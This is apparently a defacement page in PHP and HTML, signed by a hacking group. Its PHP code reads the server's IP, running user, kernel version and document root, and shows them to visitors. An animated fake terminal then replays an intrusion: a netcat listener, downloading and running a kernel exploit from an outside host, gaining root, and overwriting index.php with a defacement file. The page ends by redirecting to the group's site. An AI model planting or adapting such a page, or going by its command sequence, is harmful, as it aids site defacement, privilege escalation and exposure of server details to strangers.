<?php
//Server Information
$ip = $_SERVER['SERVER_ADDR'];
$software = $_SERVER['SERVER_SOFTWARE'];
$whoami = function_exists("posix_getpwuid") ? posix_getpwuid(posix_geteuid()) : exec("whoami");
$whoami = function_exists("posix_getpwuid") ? $whoami['name'] : exec("whoami");
if(strpos($software, "Win") != FALSE){
	$whoami = strstr($whoami, "\\");
	$whoami = substr($whoami,1);
}
$uname = php_uname();
$vers = php_uname("r");
$rootdir = $_SERVER['DOCUMENT_ROOT'];
?>
<!------------------------------------
Source written by The Almighty Plum.
Feel free to edit but give credit.
Visit p0wersurge.com
#TeamPS
                      __---__
                   _-       _--______
              __--( /     \ )XXXXXXXXXXXXX_
            --XXX(   O   O  )XXXXXXXXXXXXXXX-
           /XXX(       U     )        XXXXXXX\
         /XXXXX(              )--_  XXXXXXXXXXX\
        /XXXXX/ (      O     )   XXXXXX   \XXXXX\
        XXXXX/   /            XXXXXX   \__ \XXXXX----
        XXXXXX__/          XXXXXX         \__----  -
---___  XXX__/          XXXXXX      \__         ---
  --  --__/   ___/\  XXXXXX            /  ___---=
    -_    ___/    XXXXXX              '--- XXXXXX
      --\/XXX\ XXXXXX                      /XXXXX
        \XXXXXXXXX                        /XXXXX/
         \XXXXXX                        _/XXXXX/
           \XXXXX--__/              __-- XXXX/
            --XXXXXXX---------------  XXXXX--
               \XXXXXXXXXXXXXXXXXXXXXXXX-
                 --XXXXXXXXXXXXXXXXXX-
           * * * * * who ya gonna call? * * * * *
-------------------------------------!>
<title>In y0 b0x~</title>
<style type="text/css">
body {
background:url('http://i.imgur.com/DzeVO.jpg') no-repeat center center fixed;
-webkit-background-size: cover;
-moz-background-size: cover;
-o-background-size: cover;
background-size: cover;
color:#FFFFFF;
overflow:hidden;
}
div.box
{
width:699px;
height:420px;
padding:10px;
border-width: thin;
border:1px solid #e0e0e0;
background-color:rgba(0,0,0,0.90);
font-family: consolas;
font-size: 15;
}
#drag
{
width:699px;
height:450px;
}
a:link {color: #C0C0C0; text-decoration: none; }
a:active {color: #C0C0C0; text-decoration: none; }
a:visited {color: #C0C0C0; text-decoration: none; }
a:hover {color: #FFFFFF; text-decoration: none; }
</style>
<script type="text/javascript" src="./typingtext.js">
/****************************************************
* Typing Text script- By Twey @ Dynamic Drive Forums
****************************************************/
</script>
<center>
<div id="drag">
<img src="http://i.imgur.com/6JjZe.png"><br>
<div class="box" align="left">
r00t@TeamPS:~$ <div id="who" style="display:none;">nc -l -n -v -p 2121</div><div id="f1" style="background-color:#2080c0; display:inline;">&nbsp;</div><br>
<div id="whores" style="display:none;">listening on [any] 2121 ...</div><br>
<div id="f2" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="newline1" style="display:none;"><?php echo "$whoami@$ip:~$"; ?></div> <div id="w" style="display:none;">whoami</div><div id="f3" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="whores2" style="display:none;"><?php echo "$whoami"; ?></div><br>
<div id="newline2" style="display:none;"><?php echo "$whoami@$ip:~$"; ?></div> <div id="uname" style="display:none;">uname -a</div><div id="f4" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="unameres" style="display:none;"><?php echo "$uname"; ?></div><br>
<div id="newline3" style="display:none;"><?php echo "$whoami@$ip:~$"; ?></div> <div id="cd" style="display:none;">cd /tmp</div><div id="f5" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="newline4" style="display:none;"><?php echo "$whoami@$ip:/tmp$"; ?></div> <div id="wget" style="display:none;">wget http://p0wersurge.com/<?php echo "$vers"; ?>_exploit.c</div><div id="f6" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="newline5" style="display:none;"><?php echo "$whoami@$ip:/tmp$"; ?></div> <div id="chmod" style="display:none;">chmod 777 <?php echo "$vers"; ?>_exploit.c</div><div id="f7" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="newline6" style="display:none;"><?php echo "$whoami@$ip:/tmp$"; ?></div> <div id="comp" style="display:none;">gcc -o exploit ./<?php echo "$vers"; ?>_exploit.c</div><div id="f8" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="newline7" style="display:none;"><?php echo "$whoami@$ip:/tmp$"; ?></div> <div id="exploit" style="display:none;">./exploit</div><div id="f9" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="exploitres" style="display:none;">G0t you r00t</div><br>
<div id="newline8" style="display:none;"><?php echo "root@$ip:/tmp$"; ?></div> <div id="id" style="display:none;">id</div><div id="f10" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="idres" style="display:none;">uid=0(root) gid=0(root) groups=0(root)</div><br>
<div id="newline9" style="display:none;"><?php echo "root@$ip:/tmp$"; ?></div>  <div id="cd2" style="display:none;">cd <?php echo "$rootdir"; ?></div><div id="f11" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="newline10" style="display:none;"><?php echo "root@$ip:~$"; ?></div> <div id="wget2" style="display:none;">wget http://p0wersurge.com/deface.txt</div><div id="f12" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="newline11" style="display:none;"><?php echo "root@$ip:~$"; ?></div> <div id="rm" style="display:none;">rm index.php; mv deface.txt index.php</div><div id="f13" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="newline12" style="display:none;"><?php echo "root@$ip:~$"; ?></div> <div id="echo" style="display:none;">echo 0wned By Plum #TeamPS</div><div id="f14" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
<div id="echores" style="display:none;">0wned By Plum #TeamPS</div><br>
<div id="newline13" style="display:none;"><?php echo "root@$ip:~$"; ?></div> <div id="exit" style="display:none;">exit</div><div id="f15" style="background-color:#2080c0; display:none;">&nbsp;</div><br>
</div>
</div>
</center>
<script  type='text/javascript' src='//ajax.microsoft.com/ajax/jquery/jquery-1.4.2.min.js'></script>
<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/jquery-ui.min.js'></script>
<script type='text/javascript'>
   $(document).ready(function(){
		$('#drag').draggable();
    });
  </script>
<script type="text/javascript">
var whoami = new TypingText(document.getElementById("who"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("whores").style.display="inline"; 
document.getElementById("f1").style.display="none"; 
document.getElementById("f2").style.display="inline"; 
setTimeout(function(){
document.getElementById("f2").innerHTML="-------------------------------<br>Back Connected To <?php echo "$ip"; ?><br>-------------------------------"; 
document.getElementById("f2").style.backgroundColor=""; 
document.getElementById("newline1").style.display="inline"; 
document.getElementById("f3").style.display="inline";
setTimeout(function(){document.getElementById("w").style.display="inline"; who.run();}, 700);
}, 4000);});


var who = new TypingText(document.getElementById("w"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("whores2").style.display="inline"; 
document.getElementById("newline2").style.display="inline"; 
document.getElementById("f3").style.display="none"; 
document.getElementById("f4").style.display="inline"; 
setTimeout(function(){
document.getElementById("uname").style.display="inline";
uname.run();
}, 500);
});

var uname = new TypingText(document.getElementById("uname"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("unameres").style.display="inline"; 
document.getElementById("newline3").style.display="inline"; 
document.getElementById("f4").style.display="none"; 
document.getElementById("f5").style.display="inline"; 
setTimeout(function(){
document.getElementById("cd").style.display="inline";
cd.run();
}, 500);
});

var cd = new TypingText(document.getElementById("cd"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("unameres").style.display="inline"; 
document.getElementById("newline4").style.display="inline"; 
document.getElementById("f5").style.display="none"; 
document.getElementById("f6").style.display="inline"; 
setTimeout(function(){
document.getElementById("wget").style.display="inline";
wget.run();
}, 500);
});

var wget = new TypingText(document.getElementById("wget"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("newline5").style.display="inline"; 
document.getElementById("f6").style.display="none"; 
document.getElementById("f7").style.display="inline"; 
setTimeout(function(){
document.getElementById("chmod").style.display="inline";
chmod.run();
}, 500);
});

var chmod = new TypingText(document.getElementById("chmod"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("newline6").style.display="inline"; 
document.getElementById("f7").style.display="none"; 
document.getElementById("f8").style.display="inline"; 
setTimeout(function(){
document.getElementById("comp").style.display="inline";
comp.run();
}, 500);
});

var comp = new TypingText(document.getElementById("comp"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("newline7").style.display="inline"; 
document.getElementById("f8").style.display="none"; 
document.getElementById("f9").style.display="inline"; 
setTimeout(function(){
document.getElementById("exploit").style.display="inline";
exploit.run();
}, 500);
});

var exploit = new TypingText(document.getElementById("exploit"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("exploitres").style.display="inline"; 
document.getElementById("newline8").style.display="inline"; 
document.getElementById("f9").style.display="none"; 
document.getElementById("f10").style.display="inline"; 
setTimeout(function(){
document.getElementById("id").style.display="inline";
id.run();
}, 500);
});

var id = new TypingText(document.getElementById("id"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("idres").style.display="inline"; 
document.getElementById("newline9").style.display="inline"; 
document.getElementById("f10").style.display="none"; 
document.getElementById("f11").style.display="inline"; 
setTimeout(function(){
document.getElementById("cd2").style.display="inline";
cd2.run();
}, 500);
});

var cd2 = new TypingText(document.getElementById("cd2"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("newline10").style.display="inline"; 
document.getElementById("f11").style.display="none"; 
document.getElementById("f12").style.display="inline"; 
setTimeout(function(){
document.getElementById("wget2").style.display="inline";
wget2.run();
}, 500);
});

var wget2 = new TypingText(document.getElementById("wget2"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("newline11").style.display="inline"; 
document.getElementById("f12").style.display="none"; 
document.getElementById("f13").style.display="inline"; 
setTimeout(function(){
document.getElementById("rm").style.display="inline";
rm.run();
}, 500);
});

var rm = new TypingText(document.getElementById("rm"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("newline12").style.display="inline"; 
document.getElementById("f13").style.display="none"; 
document.getElementById("f14").style.display="inline"; 
setTimeout(function(){
document.getElementById("echo").style.display="inline";
echo.run();
}, 500);
});

var echo = new TypingText(document.getElementById("echo"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
document.getElementById("echores").style.display="inline"; 
document.getElementById("newline13").style.display="inline"; 
document.getElementById("f14").style.display="none"; 
document.getElementById("f15").style.display="inline"; 
setTimeout(function(){
document.getElementById("exit").style.display="inline";
exit.run();
}, 2500);
});

var exit = new TypingText(document.getElementById("exit"), 100, function(i){ var ar = new Array("", "", "", ""); return " " + ar[i.length % ar.length]; }, 
function whores (){
window.location = "http://p0wersurge.com/";
});

setTimeout(function(){document.getElementById("who").style.display="inline"; whoami.run();}, 1000);
</script>
